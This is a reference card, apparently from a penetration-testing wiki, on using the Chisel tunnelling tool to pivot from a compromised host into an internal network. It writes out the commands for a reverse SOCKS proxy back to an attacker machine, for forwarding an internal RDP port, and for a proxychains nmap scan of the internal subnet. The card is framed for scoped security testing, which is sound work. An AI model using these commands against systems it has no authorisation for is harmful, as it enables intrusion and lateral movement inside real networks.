---
tool: Chisel
slug: chisel
stages: [command-and-control]
category: Tunnelling and pivoting
platforms: [linux, windows, network]
services: []
ports: []
tags: [pivoting, tunnelling, socks, port-forward, c2]
attack: [T1090, T1572]
summary: A fast TCP/UDP tunnel over HTTP, in a single Go binary for every platform. Builds a SOCKS proxy or port-forward through a compromised host so your tools on the outside can reach an internal network you otherwise cannot touch.
references:
  - Chisel GitHub | https://github.com/jpillora/chisel
---

## When to reach for it

You have a foothold on a host that can see an internal subnet you cannot reach directly. Chisel turns that host into a pivot: a reverse SOCKS proxy brings the whole subnet to your attacking machine, or a port-forward exposes one internal service.

## Key flags

- `server` / `client`: the two roles.
- `--reverse` (server): allow clients to request reverse tunnels (the usual pivot direction).
- `-p 8080`: the port the server listens on.
- `--socks5`: expose a SOCKS5 proxy endpoint.
- `R:socks` (client): reverse SOCKS proxy back through the server.
- `R:LPORT:host:PORT`: reverse-forward an internal `host:PORT` to your local `LPORT`.

## Commands

Reverse SOCKS pivot: run the server on your box, the client on the foothold:

```bash
# your attacking machine (reachable by the foothold)
./chisel server --reverse -p 8080

# on the compromised host (pulled over from your machine)
./chisel client 10.10.14.5:8080 R:socks
```

Point your tools at the SOCKS proxy (default `127.0.0.1:1080`) via proxychains:

```bash
proxychains -q nmap -sT -Pn -p 445,3389 172.16.5.0/24
```

Forward a single internal service to your localhost instead:

```bash
# on the foothold
./chisel client 10.10.14.5:8080 R:3389:172.16.5.19:3389
# now 127.0.0.1:3389 on your box reaches the internal RDP host
```

## Workflow

1. From the foothold, confirm which internal subnet it can reach (`ip route`, `ifconfig`).
2. Start the Chisel server on your machine; transfer the client to the foothold.
3. Bring up a reverse SOCKS proxy, or forward the specific port you need.
4. Run your external tools through proxychains (use `-sT` TCP connect scans through SOCKS).
5. Tear the tunnel down when done and record the pivot path for the report.

## Notes

SOCKS carries TCP cleanly; UDP and ICMP do not tunnel, so some scans and ping will not work through the proxy: use TCP connect scans. Match the client and server versions. The tunnel is an obvious outbound HTTP connection on the foothold; keep it within scope and remove the binary afterwards.
